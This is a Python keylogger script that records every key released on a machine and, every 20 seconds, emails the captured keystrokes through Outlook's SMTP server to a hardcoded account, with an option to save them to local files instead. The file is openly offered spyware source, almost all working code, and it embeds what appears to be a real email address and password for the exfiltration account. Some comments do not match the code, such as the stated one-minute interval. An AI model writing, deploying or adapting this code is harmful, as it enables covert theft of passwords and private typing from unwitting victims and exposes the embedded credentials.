import keyboard  # for keylogs
import smtplib  # sending emails using SMT protocol
# modules for timer on interval
import re
from threading import Timer 
from datetime import datetime
# for sending emails and MIME
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

SEND_REPORT_EVERY = 20  # send report every minute (60 seconds)
EMAIL_ADDRESS = "clicklinkforfreeiphone@outlook.com"
EMAIL_PASSWORD = "%K8z^HiFu?U4PBb"


class Keylogger:
    def __init__(self, interval, report_method="email"):
        # pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # contains lof of keystrokes from "self.interval"
        self.log = ""
        # record start and endtimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    def callback(self, event):
        # callback envoked whenever a key is pressed
        name = event.name
        if len(name) > 1:
          # when pressed key is not a char, but special key
          # write uppercase with [ ]
          # can either be disabled or edited
          if name == "space":
             name = " "
          elif name == "enter":
               name = "[ENTER]/n"
          elif name == "decimal":
               name = "."
          else:
              name = name.replace(" ", "_")
              name = f"[{name.upper()}]"
           # key name for global "self.log" variable
        self.log += self.filter_non_alphanumeric(name)  # whenever a key is released, pressed button is appended to self.log variable
        # non-alphanumerical characters are filtered out


    def filter_non_alphanumeric(self, name):
        # filter for non-alphanumeric chars
        if not isinstance(name, str):
            raise TypeError("Input must be string")
        # defenition for alphanumerical chars
        filtered_string = re.sub(r"[^a-zA-Z0-9]+", "", name)
        return filtered_string


    def update_filename(self):  # save keylogs as local file
            # give file name to be identified by start & end dates
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"


    def report_to_file(self):
    # creates log file in directory that contains current keylogs in"self.log" variabel
    # open file in write mode
        with open(f"{self.filename}.txt", "w") as f:
        #write the keylogs in the "self.log" variabel
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def prepare_mail(self, message):
    # turns text into MIMEMultipart. Sends text and HTML version as mail
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)

        return msg.as_string()


    def sendmail(self, email, password, message, verbose=1):
    # Manages connection to Outlook (SMTP server)
        server = smtplib.SMTP(host="smtp.office365.com", port=587)
        # Connect to SMTP as TLS mode (encryption protocol)
        server.starttls()
        # login to outlook account
        server.login(email, password)
        server.sendmail(email, email, self.prepare_mail(message))
        server.quit()
        if verbose:
            print(f"{datetime.now()} - Sent an email to {email} containing:  {message}")


    def report(self):
    # Method that reports keylogs after every period of time, calls sendmail() or report_to_file()
        if self.log:
            self.end_dt = datetime.now()
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            #print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True     #timer dies when main thread dies
        timer.start()


    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Keylogger active")
        keyboard.wait()


if __name__ == "__main__":
    # send keylogs to mail
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    #save keylog to file
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()

